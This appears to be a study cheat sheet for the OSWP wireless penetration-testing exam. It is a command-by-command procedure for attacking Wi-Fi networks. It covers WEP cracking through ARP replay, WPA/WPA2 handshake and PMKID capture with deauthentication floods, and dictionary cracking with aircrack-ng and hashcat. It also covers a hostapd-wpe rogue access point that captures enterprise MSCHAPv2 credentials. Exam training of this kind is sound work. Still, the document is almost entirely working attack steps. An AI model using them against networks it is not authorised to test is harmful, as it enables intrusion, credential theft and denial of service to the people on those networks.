00

Monitor Mode & Prep

Every run

Before anything else: identify the card, kill interfering processes, and bring up a monitor interface. The suite can't see raw 802.11 frames without this.

# See wireless interfaces (e.g. wlan0)
$ iwconfig
$ airmon-ng

# Stop NetworkManager/wpa_supplicant that grab the card
$ airmon-ng check kill

# Start monitor mode -> creates wlan0mon
$ airmon-ng start wlan0

# Confirm it's in Monitor mode
$ iwconfig wlan0mon
If airmon fails or you want manual control, set it yourself: ip link set wlan0 down → iw dev wlan0 set type monitor → ip link set wlan0 up. Some adapters name the monitor iface identically (wlan0), not wlan0mon — check with iwconfig.

01

Recon & Target Selection

All cases

Scan all channels to enumerate APs and their security. Read the ENC, CIPHER, and AUTH columns to decide which path you're on.

# Broad sweep across all channels, hop freely
$ airodump-ng wlan0mon

Note the target's BSSID (AP MAC), CH (channel), ESSID (name), and any connected STATION MACs under it. Then lock onto one channel + BSSID and write to a capture file:

# Focused capture: one channel, one AP, save to disk
$ airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
airodump column reads…You're attacking
ENC = WEPWEP → Go to section: WEP
ENC = WPA/WPA2, AUTH = PSKPre-shared key → Go to section: WPA / WPA2 PSK
ENC = WPA2, AUTH = MGTEnterprise / EAP → Go to section: WPA / WPA2 EAP
02

WEP

IV collection → crack

WEP is broken by design: gather enough unique IVs and the key falls out statistically (the higher the number of #Data packets, the better). Generate traffic manually if the network is quiet.

1Capture IVs on the target
$ airodump-ng -c <channel> --bssid <BSSID> -w wep wlan0mon
# Watch the #Data column climb — you want tens of thousands
2Fake-authenticate with the AP (so it accepts your injects)
# -1 = fake auth, 0 = reassoc timing; -h = your card MAC
$ aireplay-ng -1 0 -a <BSSID> -h <YOUR-MAC> wlan0mon
3ARP-replay to flood the AP with reusable traffic
# Captures an ARP request, replays it endlessly -> IVs surge
$ aireplay-ng -3 -b <BSSID> -h <YOUR-MAC> wlan0mon
No ARP to replay? Force one with a deauth (aireplay-ng -0 1 -a <BSSID> -c <STATION>) so a client re-ARPs, or use a fragmentation / chopchop attack (-5 / -4) to forge a keystream and build a packet with packetforge-ng.
4Crack once IVs are plentiful
# Run it live while capturing; it retries as data grows
$ aircrack-ng wep-01.cap

Key prints as hex. A 64-bit WEP key cracks with ~10k IVs; 128-bit wants ~40k+. Drop the colons to use it, or just read it off the KEY FOUND line.

03

WPA / WPA2 PSK

Handshake → crack

Capture the 4-way handshake (sent when a client authenticates), then brute/dictionary-crack it offline. Force a reconnect with a deauth to speed up the capture.

1Capture on target, watch for handshake
$ airodump-ng -c <channel> --bssid <BSSID> -w psk wlan0mon
# Top-right shows "WPA handshake: <BSSID>" once caught
2Deauth a client to trigger reconnect (new terminal)
# -0 = deauth, 3 = burst count; omit station to hit all
$ aireplay-ng -0 3 -a <BSSID> -c <STATION> wlan0mon
No clients? You can't deauth nobody. Wait for one to join, or capture a PMKID instead — clientless, see step 4.
3Crack the handshake with a wordlist
$ aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> psk-01.cap
4Alt path — PMKID (no client needed)
# Capture PMKID from the AP's first EAPOL frame
$ hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert to hashcat mode 22000 format
$ hcxpcapngtool -o hash.hc22000 pmkid.pcapng

# Crack: -m 22000 covers both PMKID and EAPOL handshakes
$ hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
Key only as strong as the wordlist. If rockyou misses, generate candidates with crunch or apply hashcat rules (-r best64.rule). The password is in the exam's intended wordlist — if nothing hits, re-check your capture actually contains a full handshake with aircrack-ng psk-01.cap.
04

WPA / WPA2 Enterprise (EAP)

Rogue AP → creds

Enterprise drops the PSK for per-user auth against a RADIUS server (AUTH = MGT). Set up a rogue AP mimicking the target, let a client try to authenticate, and capture the inner credential (the MSCHAPv2 challenge/response for PEAP/EAP) to crack offline.

1Identify the EAP type & ESSID from recon

Confirm MGT auth in airodump. hostapd-wpe answers any EAP method a client offers, so you usually don't need to know it in advance — but note the ESSID to clone it exactly.

2Configure hostapd-wpe to impersonate the network
# Edit the conf: set interface, ssid to match target, channel
$ nano /etc/hostapd-wpe/hostapd-wpe.conf
#   interface=wlan0
#   ssid=<TARGET-ESSID>
#   channel=<channel>
3Launch the rogue AP & RADIUS impersonator
$ hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# On a client connect attempt it logs:
#   username, challenge, and response (netNTLMv2 / MSCHAPv2)
Clients won't connect? They may validate the server cert. Run a deauth against the real AP to push clients toward your rogue one, and make sure your clone's ESSID + channel match exactly.
4Crack the captured MSCHAPv2 response
# Asleap: dictionary attack on the challenge/response
$ asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt

# Or feed the hash to hashcat (mode 5500 = NetNTLMv1/MSCHAPv2)
$ hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt
05

Connect & Grab the Proof

After the key

Connect by the method that matches the encryption, pull a DHCP lease, and fetch the proof from the fixed address.

Before connecting, we need to drop monitor mode if we haven't already done so.
$ airmon-ng stop wlan0mon
$ systemctl start NetworkManager   # Or: service network-manager start
# Confirm wlan0 is Mode:Managed
$ iwconfig

WPA / WPA2 PSK — wpa_supplicant

Build a psk.conf from the recovered passphrase, then associate. Minimal psk.conf:

network={
    ssid="<ESSID>"
    psk="<cracked-key>"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
# Connect
$ wpa_supplicant -B -i wlan0 -c psk.conf
$ dhclient wlan0

# Grab the proof
$ curl http://192.168.1.1/proof.txt
Mind the passphrase. Wrap it in double quotes in the conf; if it contains $, ! or spaces that still trip things up, drop in the 64-character hex PSK instead. Verify association with iwconfig wlan0 (should show the ESSID) before chasing DHCP.

WEP — iwconfig direct

WEP predates WPA, so skip wpa_supplicant. Feed the hex key straight to the card (strip the colons aircrack prints).

# Connect
$ iwconfig wlan0 essid <ESSID> key <HEXKEY>
$ dhclient wlan0

# Grab the proof
$ curl http://192.168.1.1/proof.txt

WPA-EAP — wpa_supplicant with inner creds

Enterprise connects with the recovered username + password and the EAP/phase-2 method, not a PSK. Minimal eap.conf:

network={
    ssid="<ESSID>"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="<username>"
    password="<cracked-password>"
    phase2="auth=MSCHAPV2"
}
# Connect
$ wpa_supplicant -B -i wlan0 -c eap.conf
$ dhclient wlan0

# Grab the proof
$ curl http://192.168.1.1/proof.txt
Specific to OSWP exam: The flag is trivial once associated. The proof always lives at 192.168.1.1/proof.txt over plain HTTP — if curl hangs, the problem is the connection (no lease, wrong key, card still in monitor mode), not the URL.

When a case stalls

  • PSK: no handshake after deauth → confirm a client is actually associated; try PMKID instead.
  • WEP: #Data not rising → fake-auth failed (wrong MAC/filtering) or no ARP to replay; force one with deauth.
  • EAP: no creds logged → ESSID/channel mismatch, or client rejects your cert; deauth from the real AP.
  • Any: card dropped out of monitor mode → re-run airmon-ng start wlan0, re-check iwconfig.
